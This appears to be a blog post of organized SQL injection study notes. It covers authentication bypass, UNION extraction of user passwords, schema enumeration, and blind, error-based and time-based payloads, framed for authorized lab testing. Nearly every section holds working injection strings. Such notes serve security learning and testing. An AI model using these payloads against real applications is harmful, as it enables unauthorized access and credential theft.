---
title: "SQL Injection Notes - Organized Reference"
date: 2026-03-04
categories: [infosec, web-security]
tags: [sqli, union, blind-sqli, error-based-sqli, time-based-sqli, oracle, mysql, postgresql]
toc: true
toc_label: "Contents"
toc_icon: "shield-alt"
excerpt: "Organized SQL injection notes: detection flow, UNION attacks, schema enumeration, blind/error/time-based techniques, and DBMS-specific syntax."
---

> Lab use only. Test only systems you own or are explicitly authorized to assess.

## 1) Baseline SQLi checks

Typical vulnerable query pattern:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1;
```

Classic payloads:

```text
' OR 1=1--
'--
```

Examples:

- `?category=Gifts'+OR+1=1--`
- `?category=Gifts'--`

### Why it works

- `'` closes the original string
- `OR 1=1` forces a true condition
- `--` comments out trailing query parts

## 2) Authentication bypass

Payload in username field:

```text
administrator'--
```

Password can be empty if backend concatenates directly into SQL.

## 3) UNION-based data extraction

Given query:

```sql
SELECT name, description FROM products WHERE category = 'Gifts';
```

Injection:

```text
' UNION SELECT username, password FROM users--
```

### UNION requirements

1. Same number of columns on both sides
2. Compatible data types per column position

### Find column count

Method A: `ORDER BY`

```text
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

Increase until error appears.

Method B: `UNION SELECT NULL...`

```text
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

Increase `NULL` count until valid.

### Find text-compatible output columns

```text
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

### Concatenate fields into one column

Oracle example:

```sql
' UNION SELECT username || '~' || password FROM users--
```

## 4) DB version fingerprinting

- Oracle: `SELECT banner FROM v$version`
- MySQL / SQL Server: `SELECT @@version`
- PostgreSQL: `SELECT version()`

Examples:

```text
' UNION SELECT banner, NULL FROM v$version--
' UNION SELECT @@version, NULL--
' UNION SELECT version(), NULL--
```

## 5) Enumerate tables and columns (non-Oracle)

```sql
SELECT table_name FROM information_schema.tables;
SELECT column_name FROM information_schema.columns WHERE table_name='users';
```

Injection forms:

```text
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users'--
```

## 6) Blind SQLi (boolean-based)

### Basic truth test

```text
xyz' AND '1'='1--
```

### Character inference

```text
xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)>'m'--
```

> `SUBSTRING` may be `SUBSTR` on some DBMS.

### Typical extraction loop

1. Determine length (`LENGTH(password)>n`)
2. Infer each character using `>`, `<`, `=` checks
3. Build full string position by position

## 7) Blind SQLi by error behavior (Oracle pattern)

### Workflow

1. Trigger syntax error: `xyz'`
2. Confirm recovery: `xyz''`
3. Validate concatenation context: `xyz'||(SELECT '' FROM dual)||'`
4. Force controlled error with boolean condition:

```text
xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

5. Check user existence:

```text
xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

6. Check password length:

```text
xyz'||(SELECT CASE WHEN LENGTH(password)>20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

## 8) Visible error-based SQLi

Force conversion errors to leak data:

```text
TrackingId=' AND 1=CAST((SELECT 1) AS int)--
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

## 9) Time-based SQLi

SQL Server examples:

```text
' IF (1=2) WAITFOR DELAY '0:0:10'--
' IF (1=1) WAITFOR DELAY '0:0:10'--
```

Boolean extraction using delay:

```text
'; IF ((SELECT COUNT(Username) FROM Users WHERE username='administrator' AND SUBSTRING(password,1,1)>'m')=1) WAITFOR DELAY '0:0:10'--
```

## 10) DBMS syntax notes

- Oracle often requires `FROM dual` for scalar selects
- MySQL `--` requires trailing space; `#` also works as comment
- String concatenation:
  - Oracle: `||`
  - MySQL: `CONCAT(a,b)`
  - PostgreSQL: `||`

## 11) Practical checklist

1. Confirm input reflection and error behavior
2. Test quote breaking + comments
3. Determine column count
4. Identify printable/output columns
5. Fingerprint DBMS
6. Enumerate schema (if possible)
7. Choose extraction path:
   - UNION (direct)
   - boolean blind
   - error-based
   - time-based
8. Keep payloads minimal and reproducible

## 12) Safety notes

- Avoid destructive statements (`UPDATE`, `DELETE`, `DROP`) in shared labs unless required.
- `OR 1=1` can impact multiple backend queries in the same request.
- Capture request/response evidence for each step.
